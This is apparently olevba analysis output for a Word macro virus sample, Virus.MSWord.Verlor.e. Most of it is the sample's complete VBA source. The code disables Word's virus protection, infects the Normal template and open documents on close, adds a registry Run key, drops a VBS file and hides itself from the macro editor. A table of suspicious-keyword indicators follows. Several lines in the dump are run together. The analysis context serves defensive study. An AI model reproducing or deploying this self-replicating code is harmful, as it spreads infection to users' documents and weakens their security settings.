olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Verlor.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Verlor.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Verlor.e - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()


'MyName = seNse'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .A (1.2)On Error Resume Nextwindir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")
Options.VirusProtection = FalseOptions.ConfirmConversions = False
Options.SaveNormalPrompt = False
If NormalTemplate.VBProject.VBComponents.Item("Module1").CodeModule1.Lines(3, 1) <> "'MyName = seNse" Then
ActiveDocument.VBProject.VBComponents("Module1").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save

End If
If ActiveDocument.VBProject.VBComponents.Item("Module1").CodeModule1.Lines(3, 1) <> "'MyName = seNse" Then
NormalTemplate.VBProject.VBComponents("Module1").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub
Sub Stealth()
On Error Resume Next
windir = Environ("windir")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "f0re"
System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\windows\CurrentVersion\run", "seNse") = windir & "\seNse.vbs"
If Dir(windir & "\seNse.a.vbs") <> "" Then Kill (windir & "\seNse.a.vbs")
If Dir(windir & "\seNse.a.dll") <> "" Then Kill (windir & "\seNse.a.dll")
Open "c:\windows\seNse.a.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module1" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\seNse.a.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "set NT = nothing"
Print #1, "WordObj.Quit"
Close #1
NormalTemplate.VBProject.VBComponents("Module1").Export (windir & "\seNse.a.dll")
End Sub
Sub ViewVBCode()
On Error Resume Next
Call Stealth
For X = 1 To NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.CountOfLines
 Code = Code & NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.deletelines 1, NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.CountOfLines
NormalTemplate.Saved = TrueDocnumber = Application.Documents.Count
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module1").CodeModule1.deletelines 1, Documents(X).VBProject.VBComponents("Module1").CodeModule1.CountOfLines
Documents(X).Saved = True
Next X
End If
Application.ShowVisualBasicEditor = True
While Application.ShowVisualBasicEditor = TrueDoEventsWend
NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.InsertLines 1, Code
NormalTemplate.SaveDocnumber = Application.Documents.Count
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module1").CodeModule1.InsertLines 1, Code
Documents(X).SaveAs Documents(X).FullName
Next X
End If
End Sub
Sub ToolsMacro()
On Error Resume Next
For X = 1 To NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.CountOfLines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.deletelines 1, NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.CountOfLines
NormalTemplate.Saved = TrueDocnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For Y = 1 To ActiveDocument.VBProject.VBComponents("Module1").CodeModule1.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module1").CodeModule1.Lines(Y, 1) & Chr(13)
 Next Y
 For X = 1 To Docnumber
 Documents(X).VBProject.VBComponents("Module1").CodeModule1.deletelines 1, Documents(X).VBProject.VBComponents("Module1").CodeModule1.CountOfLines
 Documents(X).Saved = True
 Next X
 End If
Application.Dialogs(wdDialogToolsMacro).Show
If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module1").CodeModule1.InsertLines 1, codeNT
 NormalTemplate.Save
 If Docnumber >= 1 Then
 For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module1").CodeModule1.InsertLines 1, CodeAD
Documents(X).SaveAs Documents(X).FullName
Next X
End If
End If
End Sub
'Put this code in a Module1 called "Module1". I created a form of stealth.
'However not full stealth. But it's a nice attempt i think/hope :).
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |seNse.vbs           |Executable file name                         |
|IOC       |a.vbs               |Executable file name                         |
|IOC       |a.dll               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

